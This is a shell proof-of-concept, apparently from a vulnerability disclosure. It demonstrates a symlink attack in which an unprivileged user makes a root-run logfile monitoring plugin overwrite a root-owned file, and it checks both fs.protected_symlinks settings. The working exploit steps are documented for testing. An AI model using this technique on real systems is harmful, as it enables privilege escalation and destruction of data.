#!/bin/sh
# PoC: logfile plugin legacy-DB migration os.rename() follows an attacker-planted
# symlink -> arbitrary file overwrite as root. Incomplete fix of CVE-2026-53759.
# Runs the REAL plugin as root; attacker = unprivileged 'nagios' user.
# Tests both fs.protected_symlinks states.
set -e

MP=/mp
PLUGIN=$MP/check-plugins/logfile/logfile
export PYTHONPATH=/opt          # /opt/lib is the importable `lib` package

# unprivileged attacker
id nagios >/dev/null 2>&1 || useradd -u 1001 -m nagios

run_case() {
    STATE="$1"
    echo "=================================================================="
    echo "CASE: fs.protected_symlinks=$STATE"
    echo "=================================================================="
    echo $STATE > /proc/sys/fs/protected_symlinks

    # fresh root-owned sentinel (the file the attacker overwrites)
    printf 'ROOT-SECRET-DO-NOT-OVERWRITE\n' > /root/SENTINEL
    chown root:root /root/SENTINEL; chmod 600 /root/SENTINEL
    echo "before: $(stat -c '%U %a %s bytes' /root/SENTINEL) -> $(head -c 32 /root/SENTINEL)"

    # a monitored logfile the plugin will read
    echo "hello world" > /var/log/app.log; chmod 644 /var/log/app.log

    # clean previous state
    rm -rf /tmp/linuxfabrik-monitoring-plugins-* 2>/dev/null || true

    # ATTACKER (nagios) plants the predictable no-hash legacy-DB candidate as a
    # symlink to the root sentinel, in world-writable sticky /tmp
    LEGACY=/tmp/linuxfabrik-monitoring-plugins-logfile-app.log.db
    su nagios -c "ln -s /root/SENTINEL $LEGACY"
    echo "planted: $(ls -l $LEGACY | sed 's/  */ /g')"

    # VICTIM: root runs the real plugin with a never-seen pattern (forces the
    # migration branch: new hashed db path does not exist yet)
    set +e
    python3 "$PLUGIN" --filename /var/log/app.log --critical-pattern ZZZNOMATCH >/tmp/out.txt 2>&1
    set -e

    echo "after:  $(stat -c '%U %a %s bytes' /root/SENTINEL)"
    if head -c 16 /root/SENTINEL | grep -q "SQLite format"; then
        echo ">>> RESULT: VULNERABLE — /root/SENTINEL was OVERWRITTEN as root with SQLite data:"
        head -c 16 /root/SENTINEL | xxd | head -1
    elif head -c 32 /root/SENTINEL | grep -q "ROOT-SECRET"; then
        echo ">>> RESULT: SAFE — sentinel intact (migration did not follow the symlink)"
    else
        echo ">>> RESULT: sentinel changed (unexpected): $(head -c 32 /root/SENTINEL)"
    fi
    echo
}

run_case 1
run_case 0
